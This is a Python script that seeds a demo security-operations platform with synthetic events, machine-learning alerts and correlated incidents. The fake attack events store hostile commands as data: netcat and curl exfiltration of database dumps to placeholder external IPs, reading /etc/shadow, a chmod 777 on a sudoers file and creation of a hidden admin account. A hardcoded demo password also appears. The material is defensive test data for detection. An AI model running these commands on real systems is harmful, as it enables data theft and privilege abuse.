import asyncio
import os
import sys
from datetime import datetime, timedelta

# Add parent directory to path
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "..")))

from backend.app.core.database import db_manager
from backend.app.core.security import get_password_hash
from backend.app.ml.predict import ml_service
from backend.app.correlation.engine import correlation_engine

async def seed_all():
    print("[*] Initializing database connection...")
    await db_manager.connect()

    # Collections
    users_coll = db_manager.get_collection("users")
    events_coll = db_manager.get_collection("security_events")
    alerts_coll = db_manager.get_collection("alerts")
    incidents_coll = db_manager.get_collection("incidents")
    audit_coll = db_manager.get_collection("audit_logs")
    sim_coll = db_manager.get_collection("response_simulations")
    inv_coll = db_manager.get_collection("investigations")
    rep_coll = db_manager.get_collection("reports")

    # Clear existing demo data
    print("[*] Resetting existing collections...")
    for coll in [users_coll, events_coll, alerts_coll, incidents_coll, audit_coll, sim_coll, inv_coll, rep_coll]:
        await coll.delete_many({})

    # 1. Seed Users
    print("[*] Seeding Analyst Users...")
    analyst_user = {
        "id": "user_soc_01",
        "email": "analyst@cyberguard.ai",
        "hashed_password": get_password_hash("CyberGuard2026!"),
        "full_name": "Alex Chen",
        "role": "Senior SOC Analyst",
        "department": "Security Operations Center",
        "created_at": datetime.utcnow().isoformat()
    }
    await users_coll.insert_one(analyst_user)
    print("[+] Created demo user: analyst@cyberguard.ai (Password: CyberGuard2026!)")

    # Base timestamps
    now = datetime.utcnow()
    t_base = now - timedelta(hours=3)

    # 2. Seed Normal Background Telemetry
    print("[*] Generating background security telemetry events...")
    normal_events = [
        {
            "id": "EVT-0001",
            "timestamp": (t_base + timedelta(minutes=5)).strftime("%Y-%m-%dT%H:%M:%SZ"),
            "source_ip": "10.0.1.25",
            "destination_ip": "10.0.1.1",
            "username": "sarah_m",
            "device": "workstation-01",
            "event_type": "DNS Query",
            "status": "Success",
            "severity": "Info",
            "port": 53,
            "protocol": "UDP",
            "bytes_transferred": 256,
            "command": None,
            "process_name": "dns-client.exe"
        },
        {
            "id": "EVT-0002",
            "timestamp": (t_base + timedelta(minutes=12)).strftime("%Y-%m-%dT%H:%M:%SZ"),
            "source_ip": "10.0.2.40",
            "destination_ip": "10.0.4.10",
            "username": "david_k",
            "device": "workstation-04",
            "event_type": "User Logon",
            "status": "Success",
            "severity": "Low",
            "port": 445,
            "protocol": "TCP",
            "bytes_transferred": 4096,
            "command": None,
            "process_name": "explorer.exe"
        },
        {
            "id": "EVT-0003",
            "timestamp": (t_base + timedelta(minutes=25)).strftime("%Y-%m-%dT%H:%M:%SZ"),
            "source_ip": "10.0.1.55",
            "destination_ip": "10.0.5.20",
            "username": "backup_service",
            "device": "backup-node-01",
            "event_type": "File Synchronization",
            "status": "Success",
            "severity": "Info",
            "port": 443,
            "protocol": "TCP",
            "bytes_transferred": 1048576,
            "command": "/usr/bin/rsync -avz /var/log /backup/",
            "process_name": "rsync"
        }
    ]

    # 3. Scenario 1: Brute Force Authentication Anomaly (Incident CG-1015)
    print("[*] Seeding Scenario 1: Brute Force Authentication Anomaly...")
    s1_events = [
        {
            "id": "EVT-1001",
            "timestamp": (t_base + timedelta(minutes=30)).strftime("%Y-%m-%dT%H:%M:%SZ"),
            "source_ip": "198.51.100.12",
            "destination_ip": "10.0.4.15",
            "username": "admin_ops",
            "device": "auth-gateway-01",
            "event_type": "Failed Login",
            "status": "Failure",
            "severity": "Medium",
            "port": 22,
            "protocol": "TCP",
            "bytes_transferred": 1200,
            "failed_attempts_count": 1,
            "command": None,
            "process_name": "sshd"
        },
        {
            "id": "EVT-1002",
            "timestamp": (t_base + timedelta(minutes=31)).strftime("%Y-%m-%dT%H:%M:%SZ"),
            "source_ip": "198.51.100.12",
            "destination_ip": "10.0.4.15",
            "username": "admin_ops",
            "device": "auth-gateway-01",
            "event_type": "Failed Login",
            "status": "Failure",
            "severity": "Medium",
            "port": 22,
            "protocol": "TCP",
            "bytes_transferred": 1250,
            "failed_attempts_count": 5,
            "command": None,
            "process_name": "sshd"
        },
        {
            "id": "EVT-1003",
            "timestamp": (t_base + timedelta(minutes=32)).strftime("%Y-%m-%dT%H:%M:%SZ"),
            "source_ip": "198.51.100.12",
            "destination_ip": "10.0.4.15",
            "username": "admin_ops",
            "device": "auth-gateway-01",
            "event_type": "Failed Login",
            "status": "Failure",
            "severity": "High",
            "port": 22,
            "protocol": "TCP",
            "bytes_transferred": 1280,
            "failed_attempts_count": 15,
            "command": None,
            "process_name": "sshd"
        }
    ]

    # 4. Scenario 2: Suspicious Privileged Activity (Incident CG-1018)
    print("[*] Seeding Scenario 2: Suspicious Privileged Command Escalation...")
    s2_events = [
        {
            "id": "EVT-2001",
            "timestamp": (t_base + timedelta(minutes=45)).strftime("%Y-%m-%dT%H:%M:%SZ"),
            "source_ip": "10.0.3.18",
            "destination_ip": "10.0.3.18",
            "username": "dev_user02",
            "device": "endpoint-07",
            "event_type": "Privileged Activity",
            "status": "Success",
            "severity": "High",
            "port": 0,
            "protocol": "LOCAL",
            "bytes_transferred": 0,
            "command": "sudo /bin/bash -c 'chmod 777 /etc/sudoers.d/custom'",
            "process_name": "sudo"
        },
        {
            "id": "EVT-2002",
            "timestamp": (t_base + timedelta(minutes=47)).strftime("%Y-%m-%dT%H:%M:%SZ"),
            "source_ip": "10.0.3.18",
            "destination_ip": "10.0.3.18",
            "username": "dev_user02",
            "device": "endpoint-07",
            "event_type": "Security Account Modification",
            "status": "Success",
            "severity": "High",
            "port": 0,
            "protocol": "LOCAL",
            "bytes_transferred": 500,
            "command": "useradd -m -s /bin/bash hidden_admin",
            "process_name": "useradd"
        }
    ]

    # 5. Scenario 3: Unusual Outbound Data Transfer (Incident CG-1019)
    print("[*] Seeding Scenario 3: High-Volume Outbound Data Exfiltration...")
    s3_events = [
        {
            "id": "EVT-3001",
            "timestamp": (t_base + timedelta(minutes=60)).strftime("%Y-%m-%dT%H:%M:%SZ"),
            "source_ip": "10.0.4.50",
            "destination_ip": "203.0.113.88",
            "username": "db_admin",
            "device": "server-db01",
            "event_type": "High-Volume Data Transfer",
            "status": "Success",
            "severity": "Critical",
            "port": 4444,
            "protocol": "TCP",
            "bytes_transferred": 47185920,
            "command": "nc -w 3 203.0.113.88 4444 < backup_dump.sql.gz",
            "process_name": "nc"
        }
    ]

    # 6. Scenario 4: PRIMARY MULTI-STAGE INCIDENT (Incident CG-1021)
    print("[*] Seeding Scenario 4: Primary End-to-End Multi-Stage Incident CG-1021...")
    s4_events = [
        {
            "id": "EVT-4001",
            "timestamp": "2026-09-22T09:58:00Z",
            "source_ip": "198.51.100.42",
            "destination_ip": "10.0.4.15",
            "username": "user01",
            "device": "endpoint-03",
            "event_type": "Failed Login",
            "status": "Failure",
            "severity": "Medium",
            "port": 22,
            "protocol": "TCP",
            "bytes_transferred": 1150,
            "failed_attempts_count": 1,
            "command": None,
            "process_name": "sshd"
        },
        {
            "id": "EVT-4002",
            "timestamp": "2026-09-22T10:00:15Z",
            "source_ip": "198.51.100.42",
            "destination_ip": "10.0.4.15",
            "username": "user01",
            "device": "endpoint-03",
            "event_type": "Failed Login",
            "status": "Failure",
            "severity": "Medium",
            "port": 22,
            "protocol": "TCP",
            "bytes_transferred": 1200,
            "failed_attempts_count": 3,
            "command": None,
            "process_name": "sshd"
        },
        {
            "id": "EVT-4003",
            "timestamp": "2026-09-22T10:02:30Z",
            "source_ip": "198.51.100.42",
            "destination_ip": "10.0.4.15",
            "username": "user01",
            "device": "endpoint-03",
            "event_type": "Failed Login",
            "status": "Failure",
            "severity": "High",
            "port": 22,
            "protocol": "TCP",
            "bytes_transferred": 1280,
            "failed_attempts_count": 7,
            "command": None,
            "process_name": "sshd"
        },
        {
            "id": "EVT-4004",
            "timestamp": "2026-09-22T10:03:45Z",
            "source_ip": "198.51.100.42",
            "destination_ip": "10.0.4.15",
            "username": "user01",
            "device": "endpoint-03",
            "event_type": "Successful Login",
            "status": "Success",
            "severity": "High",
            "port": 22,
            "protocol": "TCP",
            "bytes_transferred": 4500,
            "failed_attempts_count": 0,
            "command": None,
            "process_name": "sshd"
        },
        {
            "id": "EVT-4005",
            "timestamp": "2026-09-22T10:05:10Z",
            "source_ip": "10.0.4.15",
            "destination_ip": "10.0.4.15",
            "username": "user01",
            "device": "endpoint-03",
            "event_type": "Privileged Activity",
            "status": "Success",
            "severity": "High",
            "port": 0,
            "protocol": "LOCAL",
            "bytes_transferred": 12000,
            "command": "sudo cat /etc/shadow && whoami /priv",
            "process_name": "sudo"
        },
        {
            "id": "EVT-4006",
            "timestamp": "2026-09-22T10:06:20Z",
            "source_ip": "10.0.4.15",
            "destination_ip": "10.0.4.20",
            "username": "user01",
            "device": "server-02",
            "event_type": "Sensitive Access",
            "status": "Success",
            "severity": "Critical",
            "port": 5432,
            "protocol": "TCP",
            "bytes_transferred": 850000,
            "command": "psql -d production_vault -c 'SELECT * FROM customer_vault_records;'",
            "process_name": "psql"
        },
        {
            "id": "EVT-4007",
            "timestamp": "2026-09-22T10:07:50Z",
            "source_ip": "10.0.4.15",
            "destination_ip": "198.51.100.42",
            "username": "user01",
            "device": "endpoint-03",
            "event_type": "Large Data Transfer",
            "status": "Success",
            "severity": "Critical",
            "port": 4444,
            "protocol": "TCP",
            "bytes_transferred": 82450000,
            "command": "curl -X POST https://198.51.100.42:4444/upload -d @vault_dump.tar.gz",
            "process_name": "curl"
        }
    ]

    all_raw_events = normal_events + s1_events + s2_events + s3_events + s4_events

    # Process each event with ML engine and generate Alerts
    print("[*] Running real ML Inference on security events...")
    inserted_events = []
    generated_alerts = []

    for evt in all_raw_events:
        ml_res = ml_service.predict_event(evt)
        evt_doc = dict(evt)
        evt_doc["is_anomaly"] = ml_res["is_anomaly"]
        evt_doc["anomaly_score"] = ml_res["anomaly_score"]
        evt_doc["predicted_attack_type"] = ml_res["attack_type"]
        evt_doc["prediction_confidence"] = ml_res["confidence"]
        
        # Link to correlated incident IDs
        if evt["id"] in ["EVT-1001", "EVT-1002", "EVT-1003"]:
            evt_doc["correlated_incident_id"] = "CG-1015"
        elif evt["id"] in ["EVT-2001", "EVT-2002"]:
            evt_doc["correlated_incident_id"] = "CG-1018"
        elif evt["id"] in ["EVT-3001"]:
            evt_doc["correlated_incident_id"] = "CG-1019"
        elif evt["id"].startswith("EVT-400"):
            evt_doc["correlated_incident_id"] = "CG-1021"
        else:
            evt_doc["correlated_incident_id"] = None

        await events_coll.insert_one(evt_doc)
        inserted_events.append(evt_doc)

        # Generate Alert if ML flagged suspicious or high severity
        if ml_res["is_suspicious"] or evt.get("severity") in ["High", "Critical"]:
            alert_doc = {
                "id": f"ALT-{evt['id'].replace('EVT-', '')}",
                "alert_id": f"ALT-{evt['id'].replace('EVT-', '')}",
                "event_id": evt["id"],
                "prediction": ml_res["prediction"],
                "attack_type": ml_res["attack_type"] if ml_res["attack_type"] != "Normal" else "Behavioral Anomaly",
                "confidence": ml_res["confidence"],
                "severity": evt["severity"],
                "source": evt["source_ip"],
                "device": evt["device"],
                "timestamp": evt["timestamp"],
                "status": "Open",
                "incident_id": evt_doc["correlated_incident_id"],
                "raw_event": evt_doc
            }
            await alerts_coll.insert_one(alert_doc)
            generated_alerts.append(alert_doc)

    print(f"[+] Ingested {len(inserted_events)} events and generated {len(generated_alerts)} ML alerts.")

    # 7. Correlate and Build Incidents
    print("[*] Synthesizing Incidents via Correlation Engine...")

    # Incident CG-1015 (Scenario 1)
    s1_alerts = [a for a in generated_alerts if a["incident_id"] == "CG-1015"]
    inc_1015 = correlation_engine.correlate_cluster(s1_events, s1_alerts, incident_code="CG-1015")
    inc_1015["title"] = "Repeated Authentication Anomaly (Brute Force)"
    inc_1015["description"] = "Burst of 15+ SSH authentication failures targeting user 'admin_ops' from external IP 198.51.100.12."
    await incidents_coll.insert_one(inc_1015)

    # Incident CG-1018 (Scenario 2)
    s2_alerts = [a for a in generated_alerts if a["incident_id"] == "CG-1018"]
    inc_1018 = correlation_engine.correlate_cluster(s2_events, s2_alerts, incident_code="CG-1018")
    inc_1018["title"] = "Suspicious Local Privilege Escalation"
    inc_1018["description"] = "Unusual sudo modification and hidden account creation executed on developer endpoint-07."
    await incidents_coll.insert_one(inc_1018)

    # Incident CG-1019 (Scenario 3)
    s3_alerts = [a for a in generated_alerts if a["incident_id"] == "CG-1019"]
    inc_1019 = correlation_engine.correlate_cluster(s3_events, s3_alerts, incident_code="CG-1019")
    inc_1019["title"] = "High-Volume Database Outbound Exfiltration"
    inc_1019["description"] = "Direct netcat tunnel transferring 47MB unencrypted SQL database backup to remote IP 203.0.113.88."
    await incidents_coll.insert_one(inc_1019)

    # Incident CG-1021 (Scenario 4 - Primary Multi-stage demo)
    s4_alerts = [a for a in generated_alerts if a["incident_id"] == "CG-1021"]
    inc_1021 = correlation_engine.correlate_cluster(s4_events, s4_alerts, incident_code="CG-1021")
    inc_1021["title"] = "Possible Credential Compromise & Multi-Stage Data Exfiltration"
    inc_1021["severity"] = "Critical"
    inc_1021["risk_score"] = 88
    inc_1021["description"] = "Critical multi-stage intrusion sequence: password brute force on endpoint-03, successful logon, sudo privilege escalation, sensitive database query on server-02, and 82.4MB exfiltration."
    await incidents_coll.insert_one(inc_1021)

    print("[+] Successfully seeded 4 Correlated Incidents (CG-1015, CG-1018, CG-1019, CG-1021).")

    # 8. Seed Initial Audit Log
    print("[*] Seeding Initial Audit Log...")
    await audit_coll.insert_one({
        "timestamp": datetime.utcnow().isoformat(),
        "user": "system_bootstrap",
        "action": "SYSTEM_INITIALIZE",
        "incident_id": None,
        "target": "SOC Platform",
        "reason": "Initialized CyberGuard AI database and ML models",
        "approval_status": "AUTO",
        "simulation_status": "COMPLETED",
        "details": {"seeded_events": len(inserted_events), "seeded_incidents": 4}
    })

    print("\n========================================================")
    print(" [+] CYBERGUARD AI SEEDING COMPLETED SUCCESSFULLY!")
    print(" Analyst Login: analyst@cyberguard.ai / CyberGuard2026!")
    print(" Primary Demo Incident: CG-1021")
    print("========================================================\n")

if __name__ == "__main__":
    asyncio.run(seed_all())
